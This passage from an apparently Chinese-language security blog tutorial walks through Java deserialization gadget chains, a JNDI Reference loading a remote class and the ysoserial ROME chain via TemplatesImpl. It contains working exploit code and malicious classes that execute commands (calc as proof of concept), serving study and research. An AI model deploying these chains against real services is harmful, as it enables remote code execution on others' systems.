        f1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ObjectOutputStream</span> ser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"a.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ser<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> unser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"a.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        unser<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        unser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> evil <span class="token keyword">implements</span> <span class="token class-name">ConnectionPoolDataSource</span><span class="token punctuation">,</span> <span class="token class-name">Referenceable</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token class-name">PrintWriter</span> getLogWriter <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> setLogWriter <span class="token punctuation">(</span> <span class="token class-name">PrintWriter</span> out <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> setLoginTimeout <span class="token punctuation">(</span> <span class="token keyword">int</span> seconds <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">public</span> <span class="token keyword">int</span> getLoginTimeout <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">public</span> <span class="token class-name">Logger</span> getParentLogger <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLFeatureNotSupportedException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">public</span> <span class="token class-name">PooledConnection</span> getPooledConnection <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">public</span> <span class="token class-name">PooledConnection</span> getPooledConnection <span class="token punctuation">(</span> <span class="token class-name">String</span> user<span class="token punctuation">,</span> <span class="token class-name">String</span> password <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">Reference</span> <span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"evilexp"</span><span class="token punctuation">,</span><span class="token string">"evilexp"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:10099/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>evilexp.class</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> evilexp <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token function">evilexp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1727860549206-cb142e9e-9280-4172-869a-0c4d9d4f1970.png"><br>注意，恶意类写得时候不要带包名，不然不成功</p>
<h2 id="ROME-反序列化"><a href="#ROME-反序列化" class="headerlink" title="ROME 反序列化"></a>ROME 反序列化</h2><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作</p>
<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>先把 ysoserial 中的链子贴出来</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">NativeMethodAccessorImpl</span><span class="token punctuation">.</span><span class="token function">invoke0</span><span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">NativeMethodAccessorImpl</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">DelegatingMethodAccessorImpl</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">.</span><span class="token function">beanHashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>
<span class="token operator">*</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以清楚的看到，这个类的链子跟 CC 链非常的相似，入口是 <code>HashMap.readObject()</code>跟 CC6 是相同的，结尾的 <code>TemplatesImpl.getOutputProperties()</code>这个类是 CC2 中的任意类加载的利用关键点。</p>
<p>在这个类的反序列化中，我们能看到有三个调用 toString 方法的类，我们逐一来看，我们先看 <code>ToStringBean.toString(String)</code></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731042239304-03677dac-caf5-445e-b246-68d32ef10d45.png"></p>
<p>我们能够发现，在这个 toString 方法中，我们能够调用任意的 getter 方法，在 TemplatesImpl 类中的任意类加载利用的是getOutputProperties()这个方法，所以我们能够通过这个类来利用这个 toString 方法，再来调用这个 getOutputProperties 方法来实现任意类的加载，然后我们跟进 _obj，_beanClass，NO_PARAMS，这几个参数，发现他在ToStringBean 这个类的构造方法中可控</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731042800498-b0739249-a5cc-4f61-9efd-5e76d269ffdd.png"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731042795768-cfe2b821-cff2-4081-aabc-508cfb977a96.png"></p>
<p>到此，我们的利用链就非常的清晰了，通过控制这个类的构造方法的参数，将 TemplatesImpl 类的getOutputProperties()方法进行调用，再通过这个来进行加载恶意字节码，便能成功实现反序列化</p>
<h3 id="任意调用代码实测"><a href="#任意调用代码实测" class="headerlink" title="任意调用代码实测"></a>任意调用代码实测</h3><p>既然这条链跟这个 CC 链很相似，都是加载恶意类的字节码来实现命令执行的，所以我们需要先仿造之前的 CC2 编写一个恶意类，这里我们就不额外编写了，就直接使用我之前 CC3 编写过的恶意类：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC3</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后就是编写简单的利用代码，在 TemplatesImpl 这类实现恶意类加载之前 CC 链中有讲，就不作讲解了，完成后的代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">DoubleExp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ROME</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> tmpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\MyCC3\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytecodes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ToStringBean</span> tsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>tmpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        tsb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span>  obj<span class="token punctuation">,</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行后能够正常实现功能：</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731043683403-b8a8575e-17a3-4bb1-bee4-83df63319ea6.png"></p>
<p>我们在这里向ToStringBean 类 传的参数是Templates.class 而不是TemplatesImpl.class，原因是由于TemplatesImpl 类中的 getter 方法太多，会无法调用到我们需要的方法，但Templates 这个类中只有我们需要的那个 getter 方法<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731044907176-f491b5e6-2cd3-4d4f-9599-114df1b0da81.png"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731044938710-431153fd-6a45-4bce-b53e-130dacf2c2c4.png"></p>
<h3 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h3><p>这里的入口与之前的 CC6 链相同，都是以 HashMap 的 readObject 方法为入口点的，hashMap 的最终目的是为了调用 hashcode，但是在 ROME 的EqualsBean 类中同样也有一个 HashCode:<br><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731047033115-2927af07-5953-4e18-9725-64daa8bd3084.png"></p>
<p>调用这个 hashCode 方法后会调用 beanHashCode 方法，在这个方法中正好有调用 toString，正好与前面的呼应上了。通过此处跟我们刚刚任意调用类的代码结合，就能成功进行完整的反序列化代码编写了。完整代码如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">DoubleExp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ROME_2</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> tmpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\MyCC3\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytecodes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ToStringBean</span> tsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>tmpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">EqualsBean</span> ebean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>tsb<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ebean<span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ROME_2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
